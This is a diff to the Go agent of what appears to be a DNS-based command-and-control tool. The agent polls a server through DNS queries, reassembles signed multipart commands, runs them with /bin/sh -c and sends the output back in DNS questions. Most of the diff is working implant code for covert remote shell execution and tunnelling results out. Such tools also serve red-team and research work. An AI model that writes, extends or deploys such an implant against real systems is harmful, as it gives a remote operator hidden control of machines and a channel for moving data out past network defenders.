@@ -30,7 +30,7 @@ var PacketBuffersWithSignature = make(map[int][]c2.MessagePacketWithSignature)
 
 var AgentStatus struct {
 	LastAckFromServer   uint32
-	NextMessageType     c2.MessageType
+	NextMessageType     c2.MsgType
 	NextPayload         []byte
 	CurretBatchParentID uint16
 	HealthCheckInterval time.Duration
@@ -42,26 +42,32 @@ func ResetAgent() {
 	AgentStatus.NextPayload = []byte{}
 }
 
-func ActuallyRunCommand(command string) {
-	log.Info("Running command: ", command)
+func runCommand(command string, cmdType c2.CmdType, timestamp uint32) {
+	switch cmdType {
+	case c2.CommandExec:
+		log.Info("Running command: ", command)
 
-	// Create a new context and add a timeout to it
-	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second) //todo: timeout should probably be configurable
-	defer cancel()                                                          // The cancel should be deferred so resources are cleaned up
+		// Create a new context and add a timeout to it
+		ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second) //todo: timeout should probably be configurable
+		defer cancel()                                                          // The cancel should be deferred so resources are cleaned up
 
-	cmd := exec.CommandContext(ctx, "/bin/sh", "-c", command)
+		cmd := exec.CommandContext(ctx, "/bin/sh", "-c", command)
 
-	out, err := cmd.CombinedOutput()
-	AgentStatus.NextMessageType = c2.MessageExecuteCommandRes
-	AgentStatus.NextPayload = out
-	if err != nil {
-		log.Warnf("Error in running command %s: %s", cmd, err)
-		cancel()
+		out, err := cmd.CombinedOutput()
+		AgentStatus.NextMessageType = c2.MessageExecuteCommandResponse
+		AgentStatus.NextPayload = out
+		if err != nil {
+			log.Warnf("Error in running command %s: %s", cmd, err)
+			cancel()
+		}
+	case c2.CommandEcho:
+		fmt.Printf("[SERVER AT %v]: %s\n", time.Unix(int64(timestamp), 0), command)
+		AgentStatus.NextMessageType = c2.MessageExecuteCommandResponse
+		AgentStatus.NextPayload = []byte("chatted")
 	}
-
 }
 
-func runCommand(packets []c2.MessagePacketWithSignature) error {
+func grabFullPayload(packets []c2.MessagePacketWithSignature) ([]byte, error) {
 	fullPayload := make([]byte, 0)
 	packets = c2.CheckMessageIntegrity(packets)
 	for _, packet := range packets {
@@ -71,11 +77,8 @@ func runCommand(packets []c2.MessagePacketWithSignature) error {
 	// todo: clean the memory for this parentpartID
 	delete(PacketBuffersWithSignature, int(packets[0].Msg.ParentPartID))
 	// todo: how do we acknowledge that we're done here and we both go back to healthcheck?
+	return bytes.Trim(fullPayload, "\x00"), nil
 
-	ActuallyRunCommand(string(bytes.Trim(fullPayload, "\x00")))
-	// tdo: check to see if this works
-	// ResetAgent()
-	return nil
 }
 
 func handleServerCommand(msgList []c2.MessagePacketWithSignature) error {
@@ -89,12 +92,12 @@ func handleServerCommand(msgList []c2.MessagePacketWithSignature) error {
 	// execution for last/single packets
 	switch msgType := command.Msg.MessageType; msgType {
 	case c2.MessageHealthcheck:
-		return nil // nothing to do. this means nothing needs to be changed
+		return nil // nothing to do. server wants us to remain in healthcheck mode
 	case c2.MessageExecuteCommand:
-		AgentStatus.NextMessageType = c2.MessageExecuteCommand
+		AgentStatus.NextMessageType = msgType
 
 		PacketBuffersWithSignature[int(command.Msg.ParentPartID)] = append(PacketBuffersWithSignature[int(command.Msg.ParentPartID)], command)
-		// handle multipart incoming
+		// handle multipart packets here
 		if command.Msg.ParentPartID != 0 { // multi part
 			//fist and middle packets
 			msg := c2.MessagePacket{
@@ -119,28 +122,25 @@ func handleServerCommand(msgList []c2.MessagePacketWithSignature) error {
 				}
 			}
 			if err != nil {
-				log.Warnf("Error sending Message to Server")
+				log.Warnf("Error sending Message to Server: %s", err)
 			}
 			if !command.Msg.IsLastPart {
 				return nil
 			}
 		}
-		return runCommand(PacketBuffersWithSignature[int(command.Msg.ParentPartID)])
+		fullPayload, err := grabFullPayload(PacketBuffersWithSignature[int(command.Msg.ParentPartID)])
+		if err != nil {
+			log.Warnf("error grabbing full payload: %s", err)
+		}
+		runCommand(string(fullPayload), command.Msg.Command, command.Msg.TimeStamp)
+		// AgentStatus.NextMessageType = c2.MessageHealthcheck
+		// runCommand(PacketBuffersWithSignature[int(command.Msg.ParentPartID)])
 
-	case c2.MessageExecuteCommandRes:
+	case c2.MessageExecuteCommandResponse:
 		if command.Msg.IsLastPart || command.Msg.ParentPartID == 0 {
 			log.Infof("got last part of command response") //todo: remove
 			ResetAgent()
 		}
-		return nil
-	case c2.MessageClientGetFile:
-		return nil
-	case c2.MessageClientSendFile:
-		// I think below lines will mess up my set interval coming from server. this should be explicitly set from the server as well
-		// log.Infof("Received command to upload a file to the server. Will adjust healthcheck interval to 1000 milliseconds and will adjust it further if the server demands it")
-		// AgentStatus.HealthCheckInterval = 1 * time.Second //todo: make this configurable
-		// AgentStatus.MessageTicker = time.NewTicker(time.Duration(AgentStatus.HealthCheckInterval) * time.Millisecond)
-		// todo: start sending the payload bits to the server
 		return nil
 	case c2.MessageSetHealthInterval:
 		log.Infof("Received command to explicitly set the healthcheck interval in milliseconds")
@@ -190,7 +190,7 @@ func sendHealthCheck() error {
 	for _, Q := range Questions {
 		err = SendQuestionToServer(Q)
 		if err != nil {
-			log.Warnf("Error sending Message to Server: %s", err)
+			log.Warnf("Error sending Healthcheck: %s", err)
 		}
 	}
 	return nil
@@ -198,12 +198,16 @@ func sendHealthCheck() error {
 
 func RunAgent(cmd *cobra.Command, args []string) error {
 	log.SetLevel(log.Level(conf.GlobalAgentConfig.LogLevel))
+	if conf.GlobalAgentConfig.LogLevel == uint8(log.DebugLevel) {
+		log.SetReportCaller(true)
+	}
+
 	log.Infof("Starting agent...")
 	// set global flag that we're running as Agent
 	conf.Mode = conf.RunAsAgent
 
 	// for start, we'll do a healthcheck every 10 second, and will wait for server to change this for us
-	AgentStatus.HealthCheckInterval = 10 * time.Second
+	AgentStatus.HealthCheckInterval = 3 * time.Second //todo:make this into a config parameter
 	AgentStatus.NextMessageType = c2.MessageHealthcheck
 	AgentStatus.MessageTicker = time.NewTicker(AgentStatus.HealthCheckInterval)
 
@@ -244,7 +248,7 @@ func RunAgent(cmd *cobra.Command, args []string) error {
 					log.Warnln(err)
 				}
 			}
-			if AgentStatus.NextMessageType == c2.MessageExecuteCommandRes {
+			if AgentStatus.NextMessageType == c2.MessageExecuteCommandResponse {
 				msg := c2.MessagePacket{
 					TimeStamp:   uint32(time.Now().Unix()),
 					MessageType: AgentStatus.NextMessageType,
@@ -252,12 +256,12 @@ func RunAgent(cmd *cobra.Command, args []string) error {
 				payload := []byte(AgentStatus.NextPayload)
 				Questions, _, err := c2.PreparePartitionedPayload(msg, payload, conf.GlobalAgentConfig.DnsSuffix, conf.GlobalAgentConfig.PrivateKey, conf.GlobalAgentConfig.ServerPublicKey)
 				if err != nil {
-					log.Warnf("Error sending Message to Server")
+					log.Warnf("Error sending Message to Server 1") //todo:update msg
 				}
 				for _, Q := range Questions {
 					err = SendQuestionToServer(Q)
 					if err != nil {
-						log.Infof("Error sending Message to Server: %s", err)
+						log.Infof("Error sending Message to Server 2: %s", err) //todo:update msg
 					}
 				}
 			}
